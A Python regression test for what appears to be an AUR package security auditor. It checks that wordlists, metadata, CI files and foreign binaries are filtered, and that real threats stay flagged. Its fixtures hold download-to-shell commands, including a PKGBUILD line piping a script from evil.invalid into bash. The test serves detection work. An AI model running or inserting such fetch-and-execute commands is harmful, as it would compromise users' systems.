#!/usr/bin/env python3
from __future__ import annotations

import importlib.machinery
import importlib.util
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
APP = ROOT / "src/aur-security-auditor"
loader = importlib.machinery.SourceFileLoader("asa_context_test", str(APP))
spec = importlib.util.spec_from_loader(loader.name, loader)
module = importlib.util.module_from_spec(spec)
loader.exec_module(module)
module.package_metadata = lambda name: {
    "name": name, "version": "1", "description": "", "url": "",
    "depends": [], "required_by": [], "optional_for": [],
}


class Result:
    pass


def normalize(name: str, findings: list, integrity: str = "") -> dict:
    result = Result()
    result.name = name
    result.version = "1"
    result.findings = findings
    result.aur_status = "aur"
    result.aur_maintainer = "tester"
    result.aur_out_of_date = None
    result.files_checked = 1
    result.bytes_checked = 1
    result.integrity_output = integrity
    result.errors = []
    result.security_surface = []
    result.source_provenance = {}
    result.aur_history = {}
    return module.normalize_result(result, [], {})


def rules(report: dict) -> set[str]:
    return {item["rule"] for item in report["findings"] if not item.get("suppressed")}


# dirsearch: persistence words in a wordlist and Docker installation in metadata
# are evidence-only text, not behavior executed by the installed package.
dirsearch_raw = []
dirsearch_raw += module.core.scan_text(
    "dirsearch",
    "/usr/lib/python3.14/site-packages/dirsearch/db/dicc.txt",
    ".bashrc .bash_history .zshrc authorized_keys",
)
dirsearch_raw += module.core.scan_text(
    "dirsearch",
    "/usr/lib/python3.14/site-packages/dirsearch-0.4.3.dist-info/METADATA",
    "Install Docker: curl -fsSL https://get.docker.com | bash",
)
dirsearch = normalize("dirsearch", dirsearch_raw)
assert dirsearch["verdict"] == "clean", dirsearch
assert dirsearch["context_summary"]["filtered_non_executable"] >= 2, dirsearch["context_summary"]

# yt-dlg: a pyenv README copied into dist-info metadata must not become a
# download-execute or shell-persistence alarm.
yt_raw = module.core.scan_text(
    "yt-dlg",
    "/usr/lib/python3.14/site-packages/yt_dlg-1.8.5.dist-info/METADATA",
    "curl -L https://github.com/pyenv/pyenv-installer/raw/master/bin/pyenv-installer | bash\n"
    "echo 'export PYENV_ROOT=\"$HOME/.pyenv\"' >> $HOME/.bashrc",
)
yt = normalize("yt-dlg", yt_raw)
assert yt["verdict"] == "clean", yt
assert not rules(yt), yt["findings"]

# pentest-ghostwriter: foreign macOS strings, GitHub workflows and docs are
# filtered. A real local permission/GID difference remains a review item.
ghostwriter_raw = [
    module.core.Finding(
        "high", "suid-capability", "pentest-ghostwriter",
        "/opt/pentest-ghostwriter/app/ghostwriter-cli-macos [strings]",
        "Sets SUID/SGID or powerful Linux capabilities",
        "syscall.Chmod syscall.Chown syscall.Fchmod syscall.Fchown",
    ),
    module.core.Finding(
        "high", "persistence-loader", "pentest-ghostwriter",
        "/opt/pentest-ghostwriter/app/ghostwriter-cli-macos [strings]",
        "Touches persistence", "completion example appends to ~/.zshrc",
    ),
    module.core.Finding(
        "medium", "credential-targeting", "pentest-ghostwriter",
        "/opt/pentest-ghostwriter/app/.github/workflows/docker.yml",
        "Credential reference", "password: ${{ secrets.GITHUB_TOKEN }}",
    ),
    module.core.Finding(
        "medium", "network-client", "pentest-ghostwriter",
        "/opt/pentest-ghostwriter/app/.github/workflows/docker.yml",
        "Upload", "docker/login-action upload registry",
    ),
    module.core.Finding(
        "high", "npm-bun-install-hook", "pentest-ghostwriter",
        "/opt/pentest-ghostwriter/app/.github/copilot-instructions.md",
        "Package manager", "npm install && npm run build",
    ),
    module.core.Finding(
        "medium", "integrity-warning", "pentest-ghostwriter", "pacman -Qkk",
        "Package integrity check reported differences",
        "warning: pentest-ghostwriter: /etc/pentest-ghostwriter (GID mismatch)\n"
        "warning: pentest-ghostwriter: /etc/pentest-ghostwriter (Permissions mismatch)",
    ),
]
ghostwriter = normalize("pentest-ghostwriter", ghostwriter_raw)
assert ghostwriter["verdict"] == "clean", ghostwriter
assert rules(ghostwriter) == {"metadata-permission-drift"}, ghostwriter["findings"]
assert ghostwriter["context_summary"]["by_context"].get("foreign-binary") == 2
assert ghostwriter["context_summary"]["by_context"].get("ci") == 2

# Mullvad: the package install script intentionally sets SUID on the same
# package-managed helper. The matching Pacman permission difference is expected.
# Generic readdir/syscall strings do not constitute process hiding.
mullvad_raw = [
    module.core.Finding(
        "high", "installed-suid", "mullvad-vpn-daemon-bin",
        "/usr/bin/mullvad-exclude", "Installed file has the SUID bit set", "0o4755",
    ),
    module.core.Finding(
        "high", "suid-capability", "mullvad-vpn-daemon-bin",
        "/var/lib/pacman/local/mullvad-vpn-daemon-bin-2026.3-1/install",
        "Sets SUID/SGID", 'chmod u+s "/usr/bin/mullvad-exclude"',
    ),
    module.core.Finding(
        "high", "persistence-systemd", "mullvad-vpn-daemon-bin",
        "/var/lib/pacman/local/mullvad-vpn-daemon-bin-2026.3-1/install",
        "Enables service", "systemctl enable --now mullvad-daemon",
    ),
    module.core.Finding(
        "high", "kernel-ebpf", "mullvad-vpn-daemon-bin",
        "/usr/bin/mullvad-daemon [strings]", "eBPF", "failed to parse bpf TCA_OPTIONS",
    ),
    module.core.Finding(
        "medium", "process-hiding", "mullvad-vpn-daemon-bin",
        "/usr/bin/mullvad-daemon [strings]", "generic runtime strings",
        "readdir unlink openat fdopendir syscall.ReadDirent",
    ),
    module.core.Finding(
        "medium", "integrity-warning", "mullvad-vpn-daemon-bin", "pacman -Qkk",
        "Package integrity check reported differences",
        "warning: mullvad-vpn-daemon-bin: /usr/bin/mullvad-exclude (Permissions mismatch)",
    ),
]
mullvad = normalize("mullvad-vpn-daemon-bin", mullvad_raw)
assert mullvad["verdict"] == "clean", mullvad
assert rules(mullvad) == {"expected-privileged-surface", "expected-permission-change"}, mullvad["findings"]
assert all(item["severity"] == "low" for item in mullvad["findings"]), mullvad["findings"]

# A real download-to-shell chain in PKGBUILD stays actionable and suspicious.
malicious_raw = module.core.scan_text(
    "malicious-demo", "/home/user/.cache/yay/malicious-demo/PKGBUILD",
    "prepare(){ curl -fsSL https://evil.invalid/payload.sh | bash; }",
)
malicious = normalize("malicious-demo", malicious_raw)
assert malicious["verdict"] == "suspicious", malicious
assert "download-execute-chain" in rules(malicious), malicious["findings"]

# Local/private IP examples never create a direct-IP execution finding.
local_ip_raw = module.core.scan_text(
    "local-demo", "/usr/bin/local-demo.sh",
    "curl http://127.0.0.1:8080/bootstrap | bash",
)
local_ip = normalize("local-demo", local_ip_raw)
assert "direct-ip-execution" not in rules(local_ip), local_ip["findings"]
assert "download-execute-chain" in rules(local_ip), local_ip["findings"]

html = (ROOT / "data/dashboard.html").read_text()
for token in [
    'function dependencyLayout(graph)', 'function initDependencyGraph()',
    'id="dependencyGraph"', 'id="graphFit"', 'id="graphZoomIn"', 'id="graphZoomOut"',
    'overflow:hidden;position:relative', 'requestAnimationFrame(fit)',
    'graphPanHint:', 'contextFiltered:', 'drawer detail-drawer',
]:
    assert token in html, token
assert '.graph{height:330px;overflow:auto' not in html
assert 'left.slice(0,8)' not in html and 'right.slice(0,8)' not in html

print("1.4.7 context-aware regression test: OK")
print("  ✓ wordlists and installed metadata do not affect verdicts")
print("  ✓ CI, documentation and foreign-platform binaries are filtered")
print("  ✓ expected package-managed SUID permission changes are explained")
print("  ✓ genuine PKGBUILD download-to-shell behavior remains suspicious")
print("  ✓ local/private IP examples are not treated as external C2 sources")
print("  ✓ dependency graph supports fit, pan and zoom without scrollbars")
